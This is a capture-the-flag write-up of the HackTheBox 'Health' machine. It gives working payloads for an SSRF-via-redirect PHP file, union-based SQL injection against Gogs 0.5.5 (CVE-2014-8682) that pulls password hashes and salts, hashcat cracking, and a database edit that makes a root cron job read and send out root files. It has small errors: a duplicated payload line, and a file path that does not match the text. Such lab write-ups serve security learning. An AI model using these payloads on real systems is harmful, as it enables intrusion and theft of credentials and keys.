# HackTheBox - Health

## NMAP

```bash
Nmap scan report for 10.10.11.176
Host is up (0.089s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the nmap scan we see port 3000 which is filtered so probably we need to access that 

## PORT 80 (HTTP)

<img src="https://i.imgur.com/pXYTIxZ.png"/>

The web page shows a web hook to configure for checking health status of URL so on creating a web hook it doesn't allow monitoring health status for localhost, time.htb, 127.0.0.1 as we need to check what's running on port 3000 as this could lead to `SSRF`

<img src="https://i.imgur.com/niovGLo.png"/>

But on providing our IP it accepts and creates a web hook 

<img src="https://i.imgur.com/C77Tp3w.png"/>

<img src="https://i.imgur.com/S3NVNAR.png"/>

<img src="https://i.imgur.com/HWVMTDP.png"/>

The reason why it shows the default html page is because I have a apache2 server running with a default index page

<img src="https://i.imgur.com/UJftJof.png"/>

Now we can exploit this by monitoring a php file which will make a request you to a php redirecting to `http://127.0.0.1:3000` in order to perform SSRF

https://book.hacktricks.xyz/pentesting-web/open-redirect

```php
<?php header("Location: http://10.10.11.176:3000");?>
```

I called this file `redirect.php` and move it to `/var/www/html`

<img src="https://i.imgur.com/OtZmPLG.png"/>

<img src="https://i.imgur.com/enHCNei.png"/>

So it seems like there's `Gogs` (Go Git Service) running on port 3000 which also reveals the version which is `0.5.5.1018`

<img src="https://i.imgur.com/wt0ODFL.png"/>

On google for exploits, this version is vulnearble to sqli which was reported in 2014 with a CVE `CVE-2014-8682`, this CVE is quite old but it fits for the version

https://www.exploit-db.com/exploits/35238


<img src="https://i.imgur.com/XZ7tYqs.png"/>

So I copied the payload with the header request in the php file by url encoding it 

<img src="https://i.imgur.com/p34Vxco.png"/>

And pasted this with the GET request on `/api/v1/users/serach?q`

```php
<?php header("Location: http://10.10.11.176:3000/api/v1/users/search?q=%27%2F%2A%2A%2Fand%2F%2A%2A%2Ffalse%29%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2Fnull%2Cnull%2C%40%40version%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2F%2A%2A%2Ffrom%2F%2A%2A%2Fmysql%2Edb%2F%2A%2A%2Fwhere%2F%2A%2A%2F%28%27%2525%27%253D%27");?>
```

<img src="https://i.imgur.com/DDeyk7U.png"/>

I created a webhook again, kept my netcat running to receive a response

<img src="https://i.imgur.com/orJ6BTb.png"/>

Now this should give us database version in response but it gave a blank response so sqli didn't worked here

<img src="https://i.imgur.com/EDwTNnu.png"/>

For testing this, I installed the same version of gogs on my local machine and for this I followed this article to install gogs , this is a optional step as I wanted to know why the sqli payload didn't worked 

After creating a seperate user and extracting gogs in that user's directory and got the service up and running 

<img src="https://i.imgur.com/H928e2i.png"/>

We can now visit localhost:3000 to properly install gogs by setting up the database

<img src="https://i.imgur.com/Psrcq1d.png"/>

By deafult it choses SQLite3 so maybe the database being used on the target machine is not mysql but I'll just select mysql to see if the payload is working or not

<img src="https://i.imgur.com/mnjQG3C.png"/>

<img src="https://i.imgur.com/uUs6IyD.png"/>

And after that we'll see it installed and can test for sqli

<img src="https://i.imgur.com/FWcNDse.png"/>

Using the payload to print the databae version

```sql
http://127.0.0.1:3000/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
```


<img src="https://i.imgur.com/qTnj1TH.png"/>

We can then further get the database version and then further get the table and column names

```sql
http://127.0.0.1:3000/api/v1/users/search?q=%27/**/and/**/false)/**/union/**/select/**/null,null,database(),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/where/**/(%27%25%27%3D%27
```

<img src="https://i.imgur.com/n70Zru0.png"/>

But this won't help us on the target machine as it wasn't working there so there's a possiblity that it's using sqlite3 as it's the default database for gogs, so I'll test the payload for SQLite as well but before that I'll need to re install gogs with sqlite3

<img src="https://i.imgur.com/dIwanGm.png"/>

After many trial and errors, I was able to get the correct payload for sqlite3 by printing `sqlite_version()` which it worked with `union/**/all/**/select`

```sql
http://127.0.0.1:3000/api/v1/users/search?q=%27)/**/union/**/all/**/select/**/null,null,group_concat(sqlite_version()),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/--
```

<img src="https://i.imgur.com/XFYd767.png"/>

We don't need to enumerate the column and table names as we already have the database which is setup locally, this can be viewed in either mysql or sqlite3

<img src="https://i.imgur.com/lnPtox1.png"/>

Coming back to the target machine, we'll just put the sqli payload for getting the `name` and `passwd` from `user` table in the redirect request also we need the value of `salt`  but for some reason `group_concat` didn't worked so I had to extract the values seperately

```php
<?php header("Location: http://10.10.11.176:3000/api/v1/users/search?q=%27)/**/union/**/all/**/select/**/null,null,salt,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/user--"); ?>

<?php header("Location: http://10.10.11.176:3000/api/v1/users/search?q=%27)/**/union/**/all/**/select/**/null,null,salt,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/user--"); ?>

```

Response of the passwd

<img src="https://i.imgur.com/2JBwnCa.png"/>

Response of salt

<img src="https://i.imgur.com/8HNlfT3.png"/>


The hash can be cracked with `hashcat`  by following the method shown in this repo, we need to convert the salt into base64, convert hash into hex and then base64 encode and then crack it using mode `10900`

https://github.com/kxcode/KrackerGo


<img src="https://i.imgur.com/PvfLgct.png"/>

This is how the hash will look like 

```
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

<img src="https://i.imgur.com/Ozv8d08.png"/>

<img src="https://i.imgur.com/yNx3CjJ.png"/>

With this password we can login as `susanne`

<img src="https://i.imgur.com/FRdbHjS.png"/>

I checked if we can use sudo with this user but it wasn't added in sudoers group, on transferring `pspy` and executing, it showed that something was being ran as `root` user

<img src="https://i.imgur.com/sfCZyLC.png"/>

This was executing the web hooking cronjob and was removing that cronjob from the database, we can verify it by creating a web hook again and logging with the mysql credentials which can be found fron `.env` in web directory

<img src="https://i.imgur.com/9S8A7NW.png"/>

<img src="https://i.imgur.com/MvPIwmy.png"/>

After logging with the credentials, creating the same webhook from which were able to make a request to port 3000

<img src="https://i.imgur.com/Rr1AP2m.png"/>

As there was a filter on the frontend, we can change the `monitoredUrl` to `file:///root/.ssh/id_rsa` which will return the contents of that file on our port 2222

```sql
UPDATE tasks SET monitoredUrl = "file:///root/root.txt" WHERE onlyError = "0"; 
```

<img src="https://i.imgur.com/xh5untf.png"/>

Checking our listener, we should get root's ssh key

<img src="https://i.imgur.com/03bKocg.png"/>

To format the ssh key properly, this can be done by using `echo` with `-e` to print the string with escape sequences `\n`  and to remove the blackslash `\` , we can use `sed` to replace it with a null character by piping the output string to `sed 's/\\//g'`

<img src="https://i.imgur.com/SbjpBVF.png"/>

<img src="https://i.imgur.com/cj5iiKa.png"/>


With this ssh private key we can login as root user

<img src="https://i.imgur.com/s5ppxOf.png"/>


## References
 - https://book.hacktricks.xyz/pentesting-web/open-redirect
 - https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b
 - https://www.exploit-db.com/exploits/35237
 - https://github.com/gogs/gogs/releases/tag/v0.5.5
 - https://linuxize.com/post/how-to-install-and-configure-gogs-on-ubuntu-18-04/
 - https://www.liquidweb.com/kb/how-to-install-and-configure-gogs-on-ubuntu-18-04/
 - https://stackoverflow.com/questions/10895163/how-to-find-out-the-mysql-root-password
 - https://stackoverflow.com/questions/49991865/node-js-mysql-error-1251-client-does-not-support-authentication-protocol
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
 - https://github.com/kxcode/KrackerGo
